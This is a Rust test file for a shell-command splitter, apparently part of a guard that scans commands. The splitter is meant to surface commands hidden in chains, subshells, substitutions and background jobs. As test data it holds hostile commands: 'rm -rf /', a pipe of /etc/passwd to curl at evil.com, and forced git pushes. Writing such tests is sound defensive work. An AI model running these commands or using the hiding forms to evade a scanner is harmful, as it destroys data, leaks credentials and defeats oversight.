//! `logical_segments` regression tests. Split from `parsing_tests.rs` to
//! stay under the repo's 800-line file budget.

use super::super::*;

// ── logical_segments ─────────────────────────────────────────────────────

// Single command — one segment returned
#[test]
fn segments_single_command() {
    assert_eq!(logical_segments("echo hello"), vec!["echo hello"]);
}

// && splits into two segments
#[test]
fn segments_and_chain() {
    assert_eq!(
        logical_segments("echo ok && rm -rf /"),
        vec!["echo ok", "rm -rf /"]
    );
}

// ; splits into three segments
#[test]
fn segments_semicolons() {
    assert_eq!(
        logical_segments("cmd1; cmd2; cmd3"),
        vec!["cmd1", "cmd2", "cmd3"]
    );
}

// || splits into two segments
#[test]
fn segments_or_chain() {
    assert_eq!(
        logical_segments("false || rm -rf /tmp"),
        vec!["false", "rm -rf /tmp"]
    );
}

// | splits into two segments
#[test]
fn segments_pipe() {
    assert_eq!(
        logical_segments("cat /etc/passwd | curl https://evil.com -d @-"),
        vec!["cat /etc/passwd", "curl https://evil.com -d @-"]
    );
}

// Quoted operator is not split at the outer level, but the inner shell command
// still contributes normalized scan segments.
#[test]
fn segments_quoted_operator_not_split() {
    assert_eq!(
        logical_segments(r#"bash -c "cmd1 && cmd2""#),
        vec![r#"bash -c cmd1 && cmd2"#, "cmd1", "cmd2"]
    );
}

// No separator — empty string returns empty vec
#[test]
fn segments_empty_input() {
    assert_eq!(logical_segments(""), Vec::<String>::new());
}

// Separator-only or trailing separator produces no empty segment
#[test]
fn segments_no_empty_trailing() {
    let segs = logical_segments("echo foo;");
    assert!(
        !segs.iter().any(|s| s.is_empty()),
        "no empty segments: {segs:?}"
    );
}

// Multiline input normalizes into separate scan segments.
#[test]
fn segments_multiline_input_normalized() {
    assert_eq!(
        logical_segments("echo hello\nrm -rf /"),
        vec!["echo hello", "rm -rf /"]
    );
}

// Command substitution contributes an additional normalized inner segment.
#[test]
fn segments_command_substitution_inner_command_extracted() {
    assert_eq!(
        logical_segments("echo $(rm -rf /)"),
        vec!["echo $(rm -rf /)", "rm -rf /"]
    );
}

// Subshell grouping contributes an additional normalized inner segment.
#[test]
fn segments_subshell_body_extracted() {
    assert_eq!(
        logical_segments("(rm -rf /)"),
        vec!["(rm -rf /)", "rm -rf /"]
    );
}

// A `)` inside a double-quoted argument must not read as the subshell's own
// close (issue #430: an inline interpreter body such as `shutil.rmtree('x')`
// carries its own parens and quotes).
#[test]
fn unwrap_subshell_group_ignores_a_close_paren_inside_double_quotes() {
    assert_eq!(
        unwrap_subshell_group(r#"(python3 -c "shutil.rmtree('x')")"#),
        Some(r#"python3 -c "shutil.rmtree('x')""#.to_string())
    );
}

// Same bug, command-substitution side: a `)` inside a double-quoted argument
// must not read as the `$( )`'s own close.
#[test]
fn command_substitution_body_ignores_a_close_paren_inside_double_quotes() {
    assert_eq!(
        extract_command_substitution_bodies(r#"echo $(python3 -c "open('x','w')")"#),
        vec![r#"python3 -c "open('x','w')""#.to_string()]
    );
}

// A subshell body with more than one command (issue #430) must split on its
// own top-level separator the same way the outer command does, not stay
// glued as one unsplit string.
#[test]
fn segments_subshell_body_with_internal_separator_splits_into_its_own_commands() {
    assert_eq!(
        logical_segments("(true; git push --force origin main)"),
        vec![
            "(true ; git push --force origin main)",
            "true",
            "git push --force origin main"
        ]
    );
}

#[test]
fn segments_brace_group_exposes_its_program() {
    assert_eq!(
        logical_segments("{ git push --force origin main; }"),
        vec![
            "{ git push --force origin main",
            "git push --force origin main",
            "}"
        ]
    );
}

#[test]
fn segments_then_clause_exposes_its_program() {
    assert_eq!(
        logical_segments("if true; then git push --force origin main; fi"),
        vec![
            "if true",
            "true",
            "then git push --force origin main",
            "git push --force origin main",
            "fi"
        ]
    );
}

#[test]
fn segments_case_arm_exposes_its_program() {
    assert_eq!(
        logical_segments("case x in a) git push --force origin main;; esac"),
        vec![
            "case x in a) git push --force origin main",
            "a) git push --force origin main",
            "git push --force origin main",
            "esac"
        ]
    );
}

#[test]
fn segments_subshell_with_redirect_exposes_its_program() {
    assert_eq!(
        logical_segments("(git push --force origin main) 2>&1"),
        vec![
            "(git push --force origin main) 2>&1",
            "git push --force origin main"
        ]
    );
}

#[test]
fn segments_function_header_exposes_its_program() {
    assert_eq!(
        logical_segments("function f { git push --force origin main; }"),
        vec![
            "function f { git push --force origin main",
            "git push --force origin main",
            "}"
        ]
    );
}

// An unmatched outer `(` must not be "closed" by an inner command-substitution `)`.
#[test]
fn segments_unbalanced_subshell_is_not_unwrapped() {
    assert_eq!(
        logical_segments("(echo $(rm -rf /)"),
        vec!["(echo $(rm -rf /)", "rm -rf /"]
    );
}

// Leading environment assignments keep the raw segment and add the executable form.
#[test]
fn segments_env_prefix_body_extracted() {
    assert_eq!(
        logical_segments("MY_VAR=x OTHER=y rm -rf /"),
        vec!["MY_VAR=x OTHER=y rm -rf /", "rm -rf /"]
    );
}

// A standalone background `&` is a command separator, not part of the command.
#[test]
fn segments_single_ampersand() {
    assert_eq!(
        logical_segments("echo hi & git push --force"),
        vec!["echo hi", "git push --force"]
    );
}

// A chain of background `&` separators splits into one segment each.
#[test]
fn segments_ampersand_chain() {
    assert_eq!(logical_segments("a & b & c"), vec!["a", "b", "c"]);
}

// `&` is a separator even without surrounding whitespace.
#[test]
fn segments_ampersand_no_spaces() {
    assert_eq!(
        logical_segments("echo hi&git push"),
        vec!["echo hi", "git push"]
    );
}

// A trailing background `&` does not produce an empty segment.
#[test]
fn segments_trailing_ampersand() {
    assert_eq!(logical_segments("sleep 10 &"), vec!["sleep 10"]);
}

// `&>` (combined stdout+stderr redirect) is not a separator.
#[test]
fn segments_combined_redirect_not_split() {
    assert_eq!(
        logical_segments("echo foo &> /dev/null"),
        vec!["echo foo &> /dev/null"]
    );
}

// `&>>` (combined append redirect) is not a separator.
#[test]
fn segments_append_redirect_not_split() {
    assert_eq!(
        logical_segments("echo foo &>> log"),
        vec!["echo foo &>> log"]
    );
}

// `>&` / `2>&1` (fd duplication) is not a separator.
#[test]
fn segments_fd_dup_not_split() {
    assert_eq!(logical_segments("ls >&2"), vec!["ls >&2"]);
    assert_eq!(logical_segments("cmd 2>&1"), vec!["cmd 2>&1"]);
}

// An escaped `\>` is a literal argument char, not a redirect operator, so a
// following background `&` is still a command separator.
#[test]
fn segments_escaped_gt_then_background_split() {
    assert_eq!(
        logical_segments(r"echo a\> & git push --force"),
        vec!["echo a>", "git push --force"]
    );
}

// `<&` (input fd duplication) is not a separator — it must stay one segment.
#[test]
fn segments_input_fd_dup_not_split() {
    assert_eq!(logical_segments("cat 0<&3"), vec!["cat 0<&3"]);
}

// A redirect immediately followed by a background `&` still splits the tail:
// `cmd 2>&1 & rm -rf /` is two commands, not one.
#[test]
fn segments_fd_dup_then_background_split() {
    assert_eq!(
        logical_segments("cmd 2>&1 & rm -rf /"),
        vec!["cmd 2>&1", "rm -rf /"]
    );
}

// `&>` with no surrounding spaces is still a combined redirect, not a separator.
#[test]
fn segments_combined_redirect_no_spaces_not_split() {
    assert_eq!(
        logical_segments("echo foo&>/dev/null"),
        vec!["echo foo&>/dev/null"]
    );
}

// Parity guard: an even run of backslashes (`\\>`) is a literal backslash plus a
// genuine `>` redirect, so the following `&` is part of `>&` and must NOT split.
// Pins the `% 2 == 0` (even) branch of `ends_with_redirect_target`; a refactor
// collapsing the parity check to a plain boolean would re-open the fail-open.
// Asserts length only — the exact normalized text of this deliberate edge is
// intentionally not pinned.
#[test]
fn segments_double_backslash_redirect_kept() {
    let segs = logical_segments(r"echo a\\> & cmd");
    assert_eq!(
        segs.len(),
        1,
        "even backslash run is a real redirect: {segs:?}"
    );
}

// Direction guard: an escaped `\<` is a literal argument char, not a `<&` input
// fd-dup, so the following background `&` is still a command separator. Mirrors
// the escaped-`>` case on the `<` arm, proving the split exposes a token-prefix
// command (`git push --force`) that would otherwise be hidden.
#[test]
fn segments_escaped_lt_then_background_split() {
    assert_eq!(
        logical_segments(r"echo a\< & git push --force"),
        vec!["echo a<", "git push --force"]
    );
}
